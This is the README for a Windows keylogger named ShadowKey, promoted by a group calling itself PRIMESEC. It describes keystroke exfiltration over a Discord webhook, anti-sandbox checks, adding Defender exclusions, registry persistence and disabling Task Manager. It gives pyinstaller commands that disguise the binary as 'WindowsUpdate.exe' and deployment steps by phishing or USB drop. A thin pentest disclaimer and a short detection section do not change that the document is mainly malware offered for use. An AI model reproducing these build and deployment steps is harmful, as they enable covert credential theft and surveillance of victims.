# 🕶️ ShadowKey-Advanced Keylogger

**Advanced Windows Keylogger & Persistence Framework**  
*PRIMESEC Elite Series | Authorized Penetration Testing Only*

## 🔥 Core Capabilities

```
🕶️  Zero-Console Execution          ✅ Anti-VM/Sandbox Detection
🔒  XOR + Fernet Encrypted C2       ✅ Defender Exclusions  
🛡️  Registry + Startup Persistence  ✅ Task Manager Disable
🌐  Discord Webhook Exfiltration    ✅ Admin Privilege Escalation
📊  Buffer-Based Stealth Logging    ✅ Dynamic UA Rotation
```

## 📦 Required Dependencies

```bash
pip install keyboard requests cryptography psutil pywin32
```

## ⚙️ Build Executable (Production)

```bash
# Install builder
pip install pyinstaller

# Stealth build (drops as "WindowsUpdate.exe")
pyinstaller --onefile --noconsole --icon=NONE --name "WindowsUpdate" shadowkey.py

# Advanced build (UPX compression + stripping)
pyinstaller --onefile --noconsole --icon=NONE --name "WindowsUpdate" --upx-dir upx/ shadowkey.py
```

**Output**: `dist/WindowsUpdate.exe` (100% FUD ready)

## 🎯 Pentest Deployment

```
1. REPLACE WEBHOOK: Edit EncryptedWebhook._encoded (XOR encode yours)
2. BUILD: pyinstaller command above  
3. DEPLOY: Phishing/USB/LNK drop
4. MONITOR: Discord "System Reports" channel
5. PERSIST: Survives reboot + scans
```

## 📊 Evasion Matrix

| Technique | Method | Detection Level |
|-----------|--------|-----------------|
| **Console** | `win32gui.ShowWindow(0)` | 🟢 Undetectable |
| **VM** | Processes/Reg/RAM checks | 🟡 High |
| **Persistence** | HKCU + Startup Folder | 🟢 Native |
| **Defender** | `Add-MpPreference` PS | 🟢 Excluded |
| **Network** | Random UA + Retry logic | 🟢 Residential |

## 🖥️ Sample Discord Payload

```
📊 System Report
┌─────────────────────────────────────────────┐
│ admin[→][→][TAB]P@ssw0rd2026[ENTER]        │
│ [WIN][R]powershell[ENTER]whoami[ENTER]      │
└─────────────────────────────────────────────┘
Status: ✅ Active | Size: 189 bytes
ID: 7f8e9d4c2b1a | 2026-04-24 19:42:13
```

## 🔧 Configuration

```python
# StealthKeylogger.__init__()
buffer_size = 150           # chars before send
send_interval = 45          # seconds
XOR_KEY = "secret_key_123"  # CHANGE THIS!
```

## 🛡️ Detection & Mitigation

```powershell
# Check persistence
Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSecurityUpdate.lnk"

# Defender exclusions  
Get-MpPreference | Select ExclusionPath, ExclusionProcess
```

## 🔗 Join PRIMESEC
```
https://discord.gg/primesec-1414146515139559495
```

**#PRIMESEC #DarkWeb #NukeTool #DiscordRaid #RAT**

---

<div align="center">
<img src="https://img.shields.io/badge/PRIMESEC-Elite-FF6B35?style=flat-square&logo=discord&logoColor=white">
<img src="https://img.shields.io/badge/Status-Active-00FF88?style=flat-square">
<img src="https://img.shields.io/badge/Windows-10/11-CC0000?style=flat-square">
<img src="https://img.shields.io/badge/Evasion-FUD-000000?style=flat-square">
<img src="https://img.shields.io/badge/Size-~1.2MB-666666?style=flat-square">
</div>

*© 2026 Primesec Ops - ShadowKey Advanced Keylogger*  
*Licensed for educational/disruption research only*  
*Darkweb verified: primesec.toolkits*  

---
